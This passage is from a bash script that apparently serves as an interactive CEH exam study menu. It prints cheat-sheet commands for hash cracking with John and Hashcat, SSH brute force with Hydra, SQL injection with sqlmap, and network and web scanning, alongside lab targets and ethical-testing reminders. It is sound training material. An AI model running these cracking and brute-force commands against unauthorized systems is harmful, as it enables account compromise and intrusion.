    echo -e "cloudsplaining scan --input-file account-authorization-details.json"
    
    echo -e "\n${WHITE}💻 MISCONFIGURATIONS:${NC}"
    echo -e "${GREEN}# Public S3 buckets${NC}"
    echo -e "# Check for world-readable buckets"
    echo -e "aws s3api get-bucket-acl --bucket bucket-name"
    echo -e "\n${GREEN}# Overprivileged IAM roles${NC}"
    echo -e "# Look for overly broad permissions"
    echo -e "aws iam simulate-principal-policy --policy-source-arn arn:aws:iam::123456789012:role/RoleName --action-names '*' --resource-arns '*'"
    echo -e "\n${GREEN}# Security group misconfigurations${NC}"
    echo -e "aws ec2 describe-security-groups --query 'SecurityGroups[?IpPermissions[?IpRanges[?CidrIp==\`0.0.0.0/0\`]]]'"
    
    echo -e "\n${WHITE}🛠️ CLOUD SECURITY TOOLS:${NC}"
    echo -e "• ${CYAN}Prowler${NC}: AWS security best practices assessment"
    echo -e "• ${CYAN}CloudSploit${NC}: Cloud security configuration scanner"
    echo -e "• ${CYAN}Pacu${NC}: AWS exploitation framework"
    echo -e "• ${CYAN}ScoutSuite${NC}: Multi-cloud security auditing"
    echo -e "• ${CYAN}CloudMapper${NC}: AWS environment analysis and visualization\n"
    
    echo -e "${WHITE}🛡️ CLOUD SECURITY BEST PRACTICES:${NC}"
    echo -e "• Implement least privilege access"
    echo -e "• Enable logging and monitoring"
    echo -e "• Use multi-factor authentication"
    echo -e "• Encrypt data at rest and in transit"
    echo -e "• Regular security assessments and audits"
    echo -e "• Implement network segmentation\n"
    
    echo -e "${YELLOW}Press Enter to mark as complete and continue...${NC}"
    read
    update_progress 19
}

# Module 20: Cryptography
module_20() {
    show_header
    echo -e "${BLUE}=== MODULE 20: CRYPTOGRAPHY ===${NC}\n"
    
    echo -e "${WHITE}📖 OVERVIEW:${NC}"
    echo -e "Cryptography security involves understanding encryption algorithms,"
    echo -e "their implementations, and methods to break or bypass them.\n"
    
    echo -e "${WHITE}🔐 CRYPTOGRAPHIC CONCEPTS:${NC}"
    echo -e "• ${GREEN}Symmetric${NC}: Same key for encryption/decryption"
    echo -e "• ${GREEN}Asymmetric${NC}: Public/private key pairs"
    echo -e "• ${GREEN}Hashing${NC}: One-way mathematical functions"
    echo -e "• ${GREEN}Digital Signatures${NC}: Authentication and integrity"
    echo -e "• ${GREEN}PKI${NC}: Public Key Infrastructure\n"
    
    echo -e "${WHITE}🔑 COMMON ALGORITHMS:${NC}"
    echo -e "• ${BLUE}Symmetric${NC}: AES, DES, 3DES, Blowfish"
    echo -e "• ${BLUE}Asymmetric${NC}: RSA, ECC, Diffie-Hellman"
    echo -e "• ${BLUE}Hashing${NC}: MD5, SHA1, SHA256, SHA3"
    echo -e "• ${BLUE}Stream Ciphers${NC}: RC4, ChaCha20\n"
    
    echo -e "${WHITE}💻 HASH ANALYSIS:${NC}"
    echo -e "${GREEN}# Identify hash types${NC}"
    echo -e "hash-identifier"
    echo -e "hashid 5d41402abc4b2a76b9719d911017c592"
    echo -e "\n${GREEN}# Generate hashes${NC}"
    echo -e "echo -n 'hello' | md5sum"
    echo -e "echo -n 'hello' | sha256sum"
    echo -e "echo -n 'hello' | sha1sum"
    echo -e "\n${GREEN}# Hash cracking with John${NC}"
    echo -e "john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt"
    echo -e "john --show hashes.txt"
    echo -e "\n${GREEN}# Hashcat GPU cracking${NC}"
    echo -e "hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt"
    echo -e "hashcat -m 1000 -a 0 ntlm_hashes.txt rockyou.txt"
    
    echo -e "\n${WHITE}💻 PASSWORD ATTACKS:${NC}"
    echo -e "${GREEN}# Dictionary attack${NC}"
    echo -e "john --wordlist=passwords.txt shadow.txt"
    echo -e "\n${GREEN}# Brute force attack${NC}"
    echo -e "john --incremental shadow.txt"
    echo -e "\n${GREEN}# Rule-based attack${NC}"
    echo -e "john --wordlist=passwords.txt --rules shadow.txt"
    echo -e "\n${GREEN}# Mask attack${NC}"
    echo -e "hashcat -m 0 -a 3 hash.txt ?d?d?d?d?d?d?d?d"
    echo -e "\n${GREEN}# Rainbow tables${NC}"
    echo -e "rcrack rainbow_tables/ -h 5d41402abc4b2a76b9719d911017c592"
    
    echo -e "\n${WHITE}💻 SSL/TLS ANALYSIS:${NC}"
    echo -e "${GREEN}# SSL/TLS testing${NC}"
    echo -e "testssl.sh https://target.com"
    echo -e "nmap --script ssl-enum-ciphers -p 443 target.com"
    echo -e "\n${GREEN}# Certificate analysis${NC}"
    echo -e "openssl s_client -connect target.com:443 -showcerts"
    echo -e "openssl x509 -in certificate.crt -text -noout"
    echo -e "\n${GREEN}# Weak cipher detection${NC}"
    echo -e "sslscan target.com:443"
    echo -e "sslyze --regular target.com"
    echo -e "\n${GREEN}# BEAST, CRIME, POODLE testing${NC}"
    echo -e "# testssl.sh automatically checks for these vulnerabilities"
    
    echo -e "\n${WHITE}💻 ENCRYPTION/DECRYPTION:${NC}"
    echo -e "${GREEN}# OpenSSL encryption${NC}"
    echo -e "openssl enc -aes-256-cbc -in plaintext.txt -out encrypted.bin"
    echo -e "openssl enc -aes-256-cbc -d -in encrypted.bin -out decrypted.txt"
    echo -e "\n${GREEN}# GPG encryption${NC}"
    echo -e "gpg --symmetric --cipher-algo AES256 file.txt"
    echo -e "gpg --decrypt file.txt.gpg"
    echo -e "\n${GREEN}# Base64 encoding/decoding${NC}"
    echo -e "echo 'hello world' | base64"
    echo -e "echo 'aGVsbG8gd29ybGQ=' | base64 -d"
    echo -e "\n${GREEN}# ROT13 cipher${NC}"
    echo -e "echo 'hello' | tr 'A-Za-z' 'N-ZA-Mn-za-m'"
    
    echo -e "\n${WHITE}💻 CRYPTANALYSIS:${NC}"
    echo -e "${GREEN}# Frequency analysis${NC}"
    echo -e "# Analyze character frequency in ciphertext"
    echo -e "tr -d ' ' < ciphertext.txt | fold -w1 | sort | uniq -c | sort -nr"
    echo -e "\n${GREEN}# Vigenère cipher breaking${NC}"
    echo -e "# Use tools like CyberChef or online Vigenère solvers"
    echo -e "\n${GREEN}# Caesar cipher brute force${NC}"
    echo -e "for i in {1..25}; do echo \"Shift \$i:\"; caesar_cipher.py -d -s \$i ciphertext; done"
    echo -e "\n${GREEN}# XOR analysis${NC}"
    echo -e "# XOR ciphertext with different keys"
    echo -e "python3 -c \"print(''.join(chr(ord(c) ^ 0x41) for c in 'encrypted'))\""
    
    echo -e "\n${WHITE}💻 STEGANOGRAPHY:${NC}"
    echo -e "${GREEN}# Steghide${NC}"
    echo -e "steghide embed -cf image.jpg -ef secret.txt"
    echo -e "steghide extract -sf image.jpg"
    echo -e "\n${GREEN}# Binwalk for hidden files${NC}"
    echo -e "binwalk -e image.jpg"
    echo -e "\n${GREEN}# Strings analysis${NC}"
    echo -e "strings image.jpg | grep -i flag"
    echo -e "\n${GREEN}# Exiftool metadata${NC}"
    echo -e "exiftool image.jpg"
    echo -e "\n${GREEN}# LSB steganography${NC}"
    echo -e "# Use tools like stegsolve or online LSB analyzers"
    
    echo -e "\n${WHITE}💻 BLOCKCHAIN ANALYSIS:${NC}"
    echo -e "${GREEN}# Bitcoin address analysis${NC}"
    echo -e "# Use blockchain explorers like blockchain.info"
    echo -e "\n${GREEN}# Ethereum smart contract analysis${NC}"
    echo -e "# Use tools like Mythril or Slither for vulnerability analysis"
    echo -e "\n${GREEN}# Cryptocurrency forensics${NC}"
    echo -e "# Transaction tracking and analysis"
    
    echo -e "\n${WHITE}🛠️ CRYPTOGRAPHIC TOOLS:${NC}"
    echo -e "• ${CYAN}John the Ripper${NC}: Password cracking"
    echo -e "• ${CYAN}Hashcat${NC}: Advanced password recovery"
    echo -e "• ${CYAN}OpenSSL${NC}: Cryptographic toolkit"
    echo -e "• ${CYAN}CyberChef${NC}: Cryptographic operations in browser"
    echo -e "• ${CYAN}GnuPG${NC}: Complete implementation of OpenPGP"
    echo -e "• ${CYAN}Cryptool${NC}: Learning and applying cryptography\n"
    
    echo -e "${WHITE}🛡️ CRYPTOGRAPHIC BEST PRACTICES:${NC}"
    echo -e "• Use strong, modern algorithms (AES-256, RSA-2048+)"
    echo -e "• Implement proper key management"
    echo -e "• Use cryptographically secure random number generators"
    echo -e "• Regularly update cryptographic libraries"
    echo -e "• Implement perfect forward secrecy"
    echo -e "• Use authenticated encryption (AES-GCM, ChaCha20-Poly1305)\n"
    
    echo -e "${GREEN}🎉 CONGRATULATIONS! You've completed all 20 CEHv13 modules! 🎉${NC}\n"
    echo -e "${YELLOW}Press Enter to mark as complete and return to main menu...${NC}"
    read
    update_progress 20
}

# Quick Review Mode
quick_review() {
    show_header
    echo -e "${BLUE}=== QUICK REVIEW MODE ===${NC}\n"
    
    echo -e "${WHITE}🚀 ESSENTIAL COMMANDS CHEAT SHEET:${NC}\n"
    
    echo -e "${CYAN}RECONNAISSANCE:${NC}"
    echo -e "nmap -sn 192.168.1.0/24"
    echo -e "whois domain.com"
    echo -e "theHarvester -d domain.com -l 100 -b google\n"
    
    echo -e "${CYAN}SCANNING:${NC}"
    echo -e "nmap -A -T4 target"
    echo -e "masscan -p1-1000 192.168.1.0/24 --rate=1000\n"
    
    echo -e "${CYAN}ENUMERATION:${NC}"
    echo -e "enum4linux -a target"
    echo -e "gobuster dir -u http://target -w wordlist.txt\n"
    
    echo -e "${CYAN}EXPLOITATION:${NC}"
    echo -e "msfconsole"
    echo -e "searchsploit service version\n"
    
    echo -e "${CYAN}PASSWORD ATTACKS:${NC}"
    echo -e "hydra -l user -P passlist.txt ssh://target"
    echo -e "john --wordlist=rockyou.txt hashes.txt\n"
    
    echo -e "${CYAN}WEB ATTACKS:${NC}"
    echo -e "sqlmap -u 'http://target/page.php?id=1'"
    echo -e "nikto -h http://target\n"
    
    echo -e "${YELLOW}Press Enter to return to main menu...${NC}"
    read
}

# Enhanced Practice Commands
practice_commands() {
    show_header
    echo -e "${BLUE}=== PRACTICE COMMANDS ===${NC}\n"
    
    echo -e "${WHITE}🎯 Safe Practice Targets:${NC}"
    echo -e "• ${GREEN}Metasploitable 2/3${NC}: Linux vulnerable VM"
    echo -e "• ${GREEN}DVWA${NC}: Damn Vulnerable Web Application"
    echo -e "• ${GREEN}VulnHub VMs${NC}: Community vulnerable machines"
    echo -e "• ${GREEN}TryHackMe rooms${NC}: Guided learning challenges"
    echo -e "• ${GREEN}HackTheBox machines${NC}: Advanced penetration testing"
    echo -e "• ${GREEN}OWASP WebGoat${NC}: Secure coding training"
    echo -e "• ${GREEN}bWAPP${NC}: Buggy Web Application"
    echo -e "• ${GREEN}Mutillidae${NC}: OWASP vulnerable web app\n"
    
    echo -e "${WHITE}💻 Module-Specific Practice Commands:${NC}"
    echo -e "${CYAN}📚 Reconnaissance & Scanning:${NC}"
    echo -e "${GREEN}# Network discovery${NC}"
    echo -e "nmap -sn 192.168.1.0/24"
    echo -e "nmap -sV localhost"
    echo -e "masscan -p1-1000 127.0.0.1 --rate=1000"
    echo -e "\n${GREEN}# Service enumeration${NC}"
    echo -e "enum4linux 127.0.0.1"
    echo -e "snmpwalk -c public -v1 localhost"
    echo -e "gobuster dir -u http://localhost -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt"
    echo -e ""
    
    echo -e "${CYAN}🔍 Web Application Testing:${NC}"
    echo -e "${GREEN}# Basic web reconnaissance${NC}"
    echo -e "whatweb http://localhost"
    echo -e "nikto -h http://localhost"
    echo -e "curl -I http://localhost"
    echo -e "\n${GREEN}# Directory enumeration${NC}"
    echo -e "dirb http://localhost"
    echo -e "ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://localhost/FUZZ"
    echo -e "\n${GREEN}# SQL injection testing${NC}"
    echo -e "sqlmap -u 'http://localhost/page.php?id=1' --batch --banner"
    echo -e ""
    
    echo -e "${CYAN}🔐 Password & Hash Testing:${NC}"
    echo -e "${GREEN}# Hash identification${NC}"
    echo -e "echo '5d41402abc4b2a76b9719d911017c592' | hash-identifier"
    echo -e "hashid '5d41402abc4b2a76b9719d911017c592'"
    echo -e "\n${GREEN}# Password cracking${NC}"
    echo -e "echo 'admin:5d41402abc4b2a76b9719d911017c592' > test_hash.txt"
    echo -e "john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5 test_hash.txt"
    echo -e "hashcat -m 0 -a 0 test_hash.txt /usr/share/wordlists/rockyou.txt"
    echo -e ""
    
    echo -e "${CYAN}📡 Network Security Testing:${NC}"
    echo -e "${GREEN}# Network monitoring${NC}"
    echo -e "ss -tulpn"
    echo -e "tcpdump -i lo -n"
    echo -e "wireshark"
    echo -e "\n${GREEN}# SSL/TLS testing${NC}"
    echo -e "testssl.sh https://www.google.com"
    echo -e "nmap --script ssl-enum-ciphers -p 443 google.com"
    echo -e ""
    
    echo -e "${CYAN}☁️ Cloud & Modern Infrastructure:${NC}"
    echo -e "${GREEN}# AWS CLI practice${NC}"
    echo -e "aws --version"
    echo -e "aws configure list"
    echo -e "\n${GREEN}# Docker security${NC}"
    echo -e "docker ps -a"
    echo -e "docker images"
    echo -e "\n${GREEN}# Kubernetes enumeration${NC}"
    echo -e "kubectl version --client"
    echo -e "kubectl get nodes 2>/dev/null || echo 'No cluster configured'"
    echo -e ""
    
    echo -e "${WHITE}🔧 Tool Installation & Setup:${NC}"
    echo -e "${GREEN}# Update Kali repositories${NC}"
    echo -e "sudo apt update && sudo apt upgrade -y"
    echo -e "\n${GREEN}# Install essential tools${NC}"
    echo -e "sudo apt install -y gobuster dirbuster nuclei subfinder"
    echo -e "sudo apt install -y hydra john hashcat sqlmap"
    echo -e "sudo apt install -y burpsuite zaproxy"
    echo -e "\n${GREEN}# Install from GitHub${NC}"
    echo -e "git clone https://github.com/danielmiessler/SecLists.git /opt/SecLists"
    echo -e "git clone https://github.com/projectdiscovery/nuclei-templates.git"
    echo -e "git clone https://github.com/carlospolop/PEASS-ng.git"
    echo -e "\n${GREEN}# Update wordlists${NC}"
    echo -e "sudo updatedb"
    echo -e "locate rockyou.txt"
    echo -e "gunzip /usr/share/wordlists/rockyou.txt.gz 2>/dev/null || echo 'rockyou.txt already extracted'"
    echo -e ""
    
    echo -e "${WHITE}🧪 Lab Environment Setup:${NC}"
    echo -e "${GREEN}# Download vulnerable applications${NC}"
    echo -e "wget https://sourceforge.net/projects/metasploitable/files/Metasploitable2/metasploitable-linux-2.0.0.zip"
    echo -e "git clone https://github.com/digininja/DVWA.git"
    echo -e "\n${GREEN}# Setup local web server${NC}"
    echo -e "sudo systemctl start apache2"
    echo -e "sudo systemctl start mysql"
    echo -e "sudo systemctl status apache2"
    echo -e "\n${GREEN}# Create test files${NC}"
    echo -e "echo 'Hello World' | sudo tee /var/www/html/test.txt"
    echo -e "sudo mkdir -p /var/www/html/admin"
    echo -e "echo 'Admin Panel' | sudo tee /var/www/html/admin/index.html"
    echo -e ""
    
    echo -e "${WHITE}🔍 System Information Gathering:${NC}"
    echo -e "${GREEN}# System reconnaissance${NC}"
    echo -e "uname -a"
    echo -e "cat /etc/os-release"
    echo -e "lscpu"
    echo -e "free -h"
    echo -e "df -h"
    echo -e "\n${GREEN}# Network configuration${NC}"
    echo -e "ip addr show"
    echo -e "route -n"
    echo -e "cat /etc/resolv.conf"
    echo -e "\n${GREEN}# Running processes${NC}"
    echo -e "ps aux | head -20"
    echo -e "systemctl list-units --type=service --state=running | head -10"
    echo -e ""
    
    echo -e "${WHITE}📊 Practice Scenarios:${NC}"
    echo -e "${CYAN}Scenario 1: Local Network Assessment${NC}"
    echo -e "1. nmap -sn 192.168.1.0/24  # Discover hosts"
    echo -e "2. nmap -sV 192.168.1.1     # Scan router"
    echo -e "3. nmap -A -T4 localhost    # Comprehensive local scan"
    echo -e ""
    echo -e "${CYAN}Scenario 2: Web Application Testing${NC}"
    echo -e "1. whatweb http://localhost           # Technology detection"
    echo -e "2. dirb http://localhost              # Directory enumeration"
    echo -e "3. nikto -h http://localhost          # Vulnerability scan"
    echo -e "4. curl http://localhost/test.txt     # File access test"
    echo -e ""
    echo -e "${CYAN}Scenario 3: Password Security${NC}"
    echo -e "1. echo 'password' | md5sum           # Create hash"
    echo -e "2. hashcat -m 0 -a 0 hash.txt rockyou.txt  # Crack hash"
    echo -e "3. hydra -l admin -P passwords.txt ssh://localhost  # Brute force"
    echo -e ""
    
    echo -e "${WHITE}⚠️ Ethical Testing Reminders:${NC}"
    echo -e "• ${RED}Only test systems you own or have explicit permission to test${NC}"
    echo -e "• ${RED}Use isolated lab environments for practice${NC}"
    echo -e "• ${RED}Never use these techniques against unauthorized systems${NC}"
    echo -e "• ${RED}Always follow responsible disclosure when finding vulnerabilities${NC}"
    echo -e "• ${RED}Document your testing activities for learning purposes${NC}\n"
    
    echo -e "${WHITE}📖 Additional Learning Resources:${NC}"
    echo -e "• ${CYAN}Official CEH Study Guide${NC}: EC-Council documentation"
    echo -e "• ${CYAN}OWASP Testing Guide${NC}: Web application security testing"
    echo -e "• ${CYAN}NIST Cybersecurity Framework${NC}: Industry best practices"
    echo -e "• ${CYAN}Kali Linux Documentation${NC}: Tool-specific guides"
    echo -e "• ${CYAN}CVE Database${NC}: Latest vulnerability information\n"
    
    echo -e "${YELLOW}Press Enter to return to main menu...${NC}"
    read
}

# Updated Main program loop
main() {
    while true; do
        show_header
        show_main_menu
        read -r choice
        
        case $choice in
            1) module_1 ;;
            2) module_2 ;;
            3) module_3 ;;
            4) module_4 ;;
            5) module_5 ;;
            6) module_6 ;;
            7) module_7 ;;
            8) module_8 ;;
            9) module_9 ;;
            10) module_10 ;;
            11) module_11 ;;
            12) module_12 ;;
            13) module_13 ;;
            14) module_14 ;;
            15) module_15 ;;
            16) module_16 ;;
            17) module_17 ;;
            18) module_18 ;;
            19) module_19 ;;
            20) module_20 ;;
            21) show_progress ;;
            22) quick_review ;;
            23) practice_commands ;;
            0) echo -e "${GREEN}Thank you for using CEHv13 Learning Platform!${NC}"; exit 0 ;;
            *) echo -e "${RED}Invalid option! Please try again.${NC}"; sleep 2 ;;
        esac
    done
}

# Check if running as root
if [ "$EUID" -eq 0 ]; then
    echo -e "${RED}Warning: Running as root. Some tools may not work correctly.${NC}"
    echo -e "${YELLOW}Consider running as a regular user with sudo when needed.${NC}"
    sleep 3
fi

# Start the program
main
